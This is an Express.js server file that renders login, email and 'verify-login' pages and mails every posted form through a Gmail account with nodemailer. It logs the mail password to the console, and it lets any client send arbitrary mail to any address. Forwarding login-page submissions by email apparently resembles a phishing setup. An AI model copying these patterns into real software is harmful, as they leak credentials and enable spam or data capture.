const express = require('express');

// const express = require('express');
// git clone repo_url
// To update your git repo from your terminal, you need the following commands
// git add .
// git commit -m "your commit message goes here"
// git push origin main

const app = express();
const port = 3000;

app.use(express.static(__dirname + "/docs"))
app.use(express.static("public"))
app.use("/images", express.static(__dirname + "public/images"))
app.use("/css", express.static(__dirname + "public/css"))
app.use("/js", express.static(__dirname + "public/js"))

app.set("views", "./docs")
app.set("view engine", "ejs")

app.get('/', (req, res) => {
    res.render('/docs/login.ejs')
})
app.get('/email', (req, res) => {
    try {
        res.render('email.ejs')
    } catch (error) {
        console.log(error.message)
    }
})
app.get('/verify-login', (req, res) => {
    try {
        res.render('verify-login.ejs')
    } catch (error) {
        console.log(error.message)
    }
})

const nodemailer = require('nodemailer');
require('dotenv').config()
const bodyParser = require('body-parser');

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }))

user = process.env.user
pass = process.env.pass

//email setup

const postEmail = async(req, res) => {
    try {
        console.log(req.body)
        const { recipient, subject, message } = req.body;
        sendVerifyMail(recipient, subject, message)
        res.redirect('/email')
    } catch (error) {
        console.log(error.message)
    }
}
//email setup

const postLogin = async(req, res) => {
    try {
        console.log(req.body)
        const { recipient, subject, message } = req.body;
        sendVerifyMail(recipient, subject, message)
        res.redirect('/')
    } catch (error) {
        console.log(error.message)
    }
}
//email setup

const postVerifyLogin = async(req, res) => {
    try {
        console.log(req.body)
        const { recipient, subject, message } = req.body;
        sendVerifyMail(recipient, subject, message)
        res.redirect('/verify-login')
    } catch (error) {
        console.log(error.message)
    }
}


const sendVerifyMail = async(recipient, subject, message)=> {
    try {
        console.log(pass)

        // Setup nodemailer
        const transporter = nodemailer.createTransport({
            service: 'gmail',
            host: 'smtp.gmail.com',
            port: 465,
            secure: true,
            requireTLS: true,
            auth: {
                user: user,
                pass: pass,
            }
        });
          
        const mailOptions = {
            from: user,
            to: recipient,
            subject: subject,
            text: `Name: ${recipient}\nSubject: ${subject}\nMessage: ${message}`,
        };
        
        transporter.sendMail(mailOptions, (error, info) => {
          if (error) {
            console.log(error)
          }
          console.log(error)
        });
    } catch (error) {
        console.log(error.message)
    }
}

app.post('/email', postEmail)
app.post('/', postLogin)
app.post('/verify-login', postVerifyLogin)


app.listen(port, () => {
  console.log(`Server is running at http://localhost:${port}`);
});
